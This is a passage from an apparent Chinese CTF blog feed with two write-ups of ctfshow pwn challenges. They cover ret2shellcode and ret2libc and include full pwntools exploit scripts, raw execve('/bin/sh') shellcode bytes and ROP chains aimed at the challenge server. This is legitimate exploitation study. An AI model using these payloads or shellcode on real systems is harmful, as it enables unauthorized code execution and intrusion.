int(io.recvuntil(&#x27;]&#x27;,drop=True))</span><br></pre></td></tr></table></figure><p>再说一下为什么要转成int类型，因为输出的地址，如0x7ffeebf02fb0，在python里是以字符串（bytes 类型）的形式存在的，我们需要转成16进制的地址</p><h2 id="shellcode长度超标"><a href="#shellcode长度超标" class="headerlink" title="shellcode长度超标"></a>shellcode长度超标</h2><p>一开始的思路是想往v5里写shellcode的，但是v5的长度只有2*8&#x3D;16个字节，shellcode的长度肯定是大于v5的长度的，所以我们需要想想别的办法</p><p>我们必须要和上个题区分开的是，上个题给我们的变量buf2在.bss段，这一次给的v5在栈上，0x7ffd46799d80，一般来说，0x7ff这种的地址都在栈上</p><p>全局变量存放在 .bss 或 .data 段<br>局部变量存放在栈上</p><p>这是ELF程序的主要内存布局</p><p>[高地址]<br>stack（栈）<br>heap（堆）<br>bss, data（全局变量）<br>text（代码）<br>[低地址]</p><p>所以既然v5写不了，那我们可以直接写到v5后面的栈上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27; * 0x18 + p64(v5_addr + 0x20) + shellcode</span><br></pre></td></tr></table></figure><p>这里的payload我想了得一个小时，其实很简单</p><p>gets函数从v5开始写，我们还是常规的先填充0x10+8&#x3D;0x18个字节到rip，关键是v5_addr + 0x20怎么去理解</p><p>p64(v5_addr + 0x20)得到的就是v5_addr往后第0x20个长度的地址，而0x20-0x18&#x3D;8个字节，也就是我们用b’a’ * 0x18的填充后的下一个槽，也所以rip指向的就是v5_addr + 0x20这个地址，我们把shellcode写到了往后的栈上</p><p>v5_addr + 0x00 : padding<br>v5_addr + 0x10 : padding<br>v5_addr + 0x18 : saved_RBP 被覆盖<br>v5_addr + 0x20 : saved_RIP 被覆盖 ← 写入的跳转地址<br>v5_addr + 0x28 : 这里开始是 shellcode<br>v5_addr + 0x30 : (继续 shellcode)<br>…</p><p>完整payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28192)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(&#x27;[&#x27;)</span><br><span class="line">v5_addr = int(io.recvuntil(&#x27;]&#x27;,drop=True),16)</span><br><span class="line">print(hex(v5_addr))</span><br><span class="line">payload = b&#x27;a&#x27; * 0x18 + p64(v5_addr + 0x20) + shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-21_20-22-20.wizoa8lk1.webp"></p><h1 id="ctfshow-pwn62（编写短的shellcode）"><a href="#ctfshow-pwn62（编写短的shellcode）" class="headerlink" title="ctfshow pwn62（编写短的shellcode）"></a>ctfshow pwn62（编写短的shellcode）</h1><blockquote><p>短了一点</p></blockquote><blockquote><p>考点：长度更短的shellcode编写</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; // rdi</span><br><span class="line">  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  buf[0] = 0LL;</span><br><span class="line">  buf[1] = 0LL;</span><br><span class="line">  v3 = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, 0LL, 1, 0LL);</span><br><span class="line">  logo(v3, 0LL);</span><br><span class="line">  puts(&quot;Welcome to CTFshow!&quot;);</span><br><span class="line">  printf(&quot;What&#x27;s this : [%p] ?\n&quot;, buf);</span><br><span class="line">  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);</span><br><span class="line">  read(0, buf, 0x38uLL);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题和上一题的最大区别是gets函数换成了read函数，并且限制了我们读入的长度为0x38uLL</p><p>这个时候pwntools自动生成的shellcode显然太长了，于是我们需要自己写一些短的shellcode，并且换成机器码</p><p>我用AI写了好几个shellcode都不行，于是抄了别的大佬博客上的，终于可以了</p><p>32 位 短字节 shellcode （21 字节） \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p><p>64 位 较短的 shellcode （23 字节）\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</p><p>exp如下，和上题区别只有shellcode不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28278)</span><br><span class="line"></span><br><span class="line">shellcode = b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><span class="line">io.recvuntil(&#x27;[&#x27;)</span><br><span class="line">v5_addr = int(io.recvuntil(&#x27;]&#x27;,drop=True),16)</span><br><span class="line">print(hex(v5_addr))</span><br><span class="line">payload = b&#x27;a&#x27; * 0x18 + p64(v5_addr + 0x20) + shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-23_17-43-35.3rbnwrv1t4.webp"></p><h1 id="ctfshow-pwn62（同pwn62）"><a href="#ctfshow-pwn62（同pwn62）" class="headerlink" title="ctfshow pwn62（同pwn62）"></a>ctfshow pwn62（同pwn62）</h1><blockquote><p>又短了一点</p></blockquote><blockquote><p>考点：长度更短的shellcode编写</p></blockquote><p>和上一个题的exp一模一样，因为我找的shellcode已经是相当相当短的了</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-23_17-38-18.26lwxar8cu.png"></p><h1 id="ctfshow-pwn60-1"><a href="#ctfshow-pwn60-1" class="headerlink" title="ctfshow pwn60"></a>ctfshow pwn60</h1><blockquote><p>有时候开启某种保护并不代表这条路不通<br>考点：mmap函数</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *buf; // [esp+8h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  buf = mmap(0, 0x400u, 7, 34, 0, 0);</span><br><span class="line">  alarm(0xAu);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 2, 0);</span><br><span class="line">  puts(&quot;Some different!&quot;);</span><br><span class="line">  if ( read(0, buf, 0x400u) &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Illegal entry!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  ((void (*)(void))buf)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题有点意思，确实开了NX保护，但是给了一个特殊的函数mmap，它可以将文件或其他对象映射至进程的内存地址空间，使得进程能像访问内存一样直接操作文件内容</p><p>那就直接写shellcode就好了，连栈溢出都不需要了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28156)</span><br><span class="line">shellcode=b&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里我顺便试了一下刚才的32位的机器码，也是可以打得通的</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-23_18-17-56.6pny0bbnd9.webp"></p><h1 id="ctfshow-pwn65-68"><a href="#ctfshow-pwn65-68" class="headerlink" title="ctfshow pwn65-68"></a>ctfshow pwn65-68</h1><p>感觉难度确实上来了，有个新知识nop sled感觉挺难的，但是问了下AI感觉也很重要，打算先鸽一下，下个周回来补吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先写在前面：所有题都是没有开NX保护的，我都checksec过了，就不再每一题都贴了&lt;/p&gt;
&lt;h1 id=&quot;ctfshow-pwn60&quot;&gt;&lt;a href=&quot;#ctfshow-pwn60&quot; class=&quot;headerlink&quot; title=&quot;ctfshow pwn60&quot;&gt;</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2shellcode" scheme="https://jiutian521.github.io/tags/ret2shellcode/"/>
    
  </entry>
  
  <entry>
    <title>ret2libc进阶刷题</title>
    <link href="https://jiutian521.github.io/posts/15ec6f36.html"/>
    <id>https://jiutian521.github.io/posts/15ec6f36.html</id>
    <published>2025-11-18T04:00:00.000Z</published>
    <updated>2025-11-25T01:53:52.767Z</updated>
    
    <content type="html"><![CDATA[<p>写了这么多ret2libc的博客，下面我们开始正式进入刷题，正好ctf关于ret2libc的题还有不少，那么我们就一道一道来。简单题只大体贴一下题目和exp，难题可以展开讲讲</p><h1 id="ctfshow-pwn47（32位）"><a href="#ctfshow-pwn47（32位）" class="headerlink" title="ctfshow pwn47（32位）"></a>ctfshow pwn47（32位）</h1><blockquote><p>ez ret2libc</p></blockquote><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_20-39-20.5mo8ifdd0u.webp"></p><p>确实是很简单，给我打印了函数的真实地址，不过都无需了，直接套模板，改个偏移量和文件名完事</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.binary = &#x27;./pwn47&#x27;</span><br><span class="line"></span><br><span class="line">#sh = process(&#x27;./pwn47&#x27;)</span><br><span class="line">sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28229)</span><br><span class="line">pwn47 = ELF(&#x27;./pwn47&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = pwn47.plt[&#x27;puts&#x27;]</span><br><span class="line">libc_start_main_got = pwn47.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">main = pwn47.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * (0x9C+0x4), puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(b&#x27;Start your show time:&#x27;, payload)</span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; *(0x9C+0x4) , system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_20-44-08.9dde3o5ay4.webp"></p><h1 id="ctfshow-pwn48（32位）"><a href="#ctfshow-pwn48（32位）" class="headerlink" title="ctfshow pwn48（32位）"></a>ctfshow pwn48（32位）</h1><blockquote><p>没有write了，试试用puts吧，更简单了呢</p></blockquote><p>其实我也不理解这个题是何意味，大概是想让我们用write函数泄露libc地址，但是我们直接用万能的libc_start_main_addr，一招鲜吃遍天</p><p>题目没有什么大的变化就不贴了，甚至偏移都懒得改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.binary = &#x27;./pwn48&#x27;</span><br><span class="line"></span><br><span class="line">#sh = process(&#x27;./pwn45&#x27;)</span><br><span class="line">sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28280)</span><br><span class="line">pwn48 = ELF(&#x27;./pwn48&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = pwn48.plt[&#x27;puts&#x27;]</span><br><span class="line">libc_start_main_got = pwn48.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">main = pwn48.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * (0x6B+0x4), puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(b&#x27;O.o?&#x27;, payload)</span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; *(0x6B+0x4) , system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_20-56-36.2dp4ls8zer.webp"></p><h1 id="ctfshow-pwn50（64位）"><a href="#ctfshow-pwn50（64位）" class="headerlink" title="ctfshow pwn50（64位）"></a>ctfshow pwn50（64位）</h1><blockquote><p>好像哪里不一样了<br>远程libc环境 Ubuntu 18</p></blockquote><p>别问我为什么直接跳到pwn50了，因为pwn49是个静态编译的题目，不属于我们的动态编译一类，所以暂时跳过，回头单独写一篇博客讲讲</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;Hello CTFshow&quot;);</span><br><span class="line">  return gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.binary = &#x27;./pwn50&#x27;</span><br><span class="line"></span><br><span class="line">#sh = process(&#x27;./pwn50&#x27;)</span><br><span class="line">sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28305)</span><br><span class="line">pwn50 = ELF(&#x27;./pwn50&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = pwn50.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = pwn50.got[&#x27;puts&#x27;]</span><br><span class="line">main = pwn50.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">#以上套模板照抄</span><br><span class="line"></span><br><span class="line">offset = 0x20 + 0x8</span><br><span class="line">ret_addr = 0x04004fe</span><br><span class="line">pop_rdi_addr = 0x04007e3</span><br><span class="line"></span><br><span class="line">#ROPgadget算一下</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = b&#x27;A&#x27; * (0x20+0x8)</span><br><span class="line">payload += p64(pop_rdi_addr)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">sh.sendlineafter(b&#x27;Hello CTFshow&#x27;, payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">puts_addr =u64(sh.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">#注意接收libc地址的方式不同</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">#以上计算过程套模板照抄</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x20+0x8)</span><br><span class="line">payload += p64(pop_rdi_addr) #pop rdi</span><br><span class="line">payload += p64(bin_sh_addr) #bin/sh</span><br><span class="line">payload += p64(ret_addr) #ret</span><br><span class="line">payload += p64(system_addr) #system</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>但是我的libcsearcher直接报错</p><blockquote><p>No matched libc, please add more libc or try others</p></blockquote><p>我一开始以为是函数的问题，把__libc_start_main换成了puts函数去泄露libc，但还是同样的问题</p><p>这个事就很郁闷，我查了一下解决方案，得知可以全部删掉后重新克隆一遍，我感觉风险有点大，而且听说别的师傅花了好几个小时克隆，我感觉没有必要，就暂时不弄了吧。对照别的师傅写的wp，我的exp应该是没问题</p><p>然后看了几个师傅的博客，在打这个题的时候也遇到了同样的问题，最后知道了libc版本是libc6_2.27-3ubuntu1.5_amd64，所以这个题先鸽了吧，如果以后还遇到这种情况我再想想办法</p><h1 id="ctfshow-pwn52（利用栈溢出覆盖参数）"><a href="#ctfshow-pwn52（利用栈溢出覆盖参数）" class="headerlink" title="ctfshow pwn52（利用栈溢出覆盖参数）"></a>ctfshow pwn52（利用栈溢出覆盖参数）</h1><blockquote><p>迎面走来的flag让我如此蠢蠢欲动</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  puts(&quot;What do you want?&quot;);</span><br><span class="line">  ctfshow();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char s[104]; // [esp+Ch] [ebp-6Ch] BYREF</span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  return puts(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>左侧函数栏存在明显的flag函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">char *__cdecl flag(int a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  char *result; // eax</span><br><span class="line">  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF</span><br><span class="line">  FILE *stream; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  result = fgets(s, 64, stream);</span><br><span class="line">  if ( a1 == 876 &amp;&amp; a2 == 877 )</span><br><span class="line">    result = (char *)printf(s);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这个题再复习一遍32位系统下，函数的参数是从右往左入栈的即a2先入，a1后入，a2在高地址，栈结构大体如下。我们的payload覆盖方向和栈增长的方向是相反的，这不难理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[高地址]  </span><br><span class="line">a2</span><br><span class="line">a1  </span><br><span class="line">返回地址  </span><br><span class="line">flag  </span><br><span class="line">offset  </span><br><span class="line">[低地址]  </span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27; </span><br><span class="line">#p = process(&#x27;./pwn52&#x27;) </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28307) </span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn52&#x27;)</span><br><span class="line">flag_addr = elf.symbols[&#x27;flag&#x27;] </span><br><span class="line"></span><br><span class="line">a1 = 0x36c</span><br><span class="line">a2 = 0x36d</span><br><span class="line">offset = (0x6C+0x4)</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    b&#x27;A&#x27; * offset,</span><br><span class="line">    flag_addr,</span><br><span class="line">    0xdeadbeef,</span><br><span class="line">    a1,</span><br><span class="line">    a2,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-19_19-19-09.5j4mm22ck2.webp"></p><p>直接给了ctfshow_flag文件里的内容</p><h1 id="还没填的坑"><a href="#还没填的坑" class="headerlink" title="还没填的坑"></a>还没填的坑</h1><h2 id="ctfshow-pwn49"><a href="#ctfshow-pwn49" class="headerlink" title="ctfshow pwn49"></a>ctfshow pwn49</h2><p>静态编译</p><h2 id="ctfshow-pwn51"><a href="#ctfshow-pwn51" class="headerlink" title="ctfshow pwn51"></a>ctfshow pwn51</h2><p>没学过C++</p><h2 id="ctfshow-pwn53（已填）"><a href="#ctfshow-pwn53（已填）" class="headerlink" title="ctfshow pwn53（已填）"></a>ctfshow pwn53（已填）</h2><p>类canary爆破，先学学python再来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写了这么多ret2libc的博客，下面我们开始正式进入刷题，正好ctf关于ret2libc的题还有不少，那么我们就一道一道来。简单题只大体贴一下题目和exp，难题可以展开讲讲&lt;/p&gt;
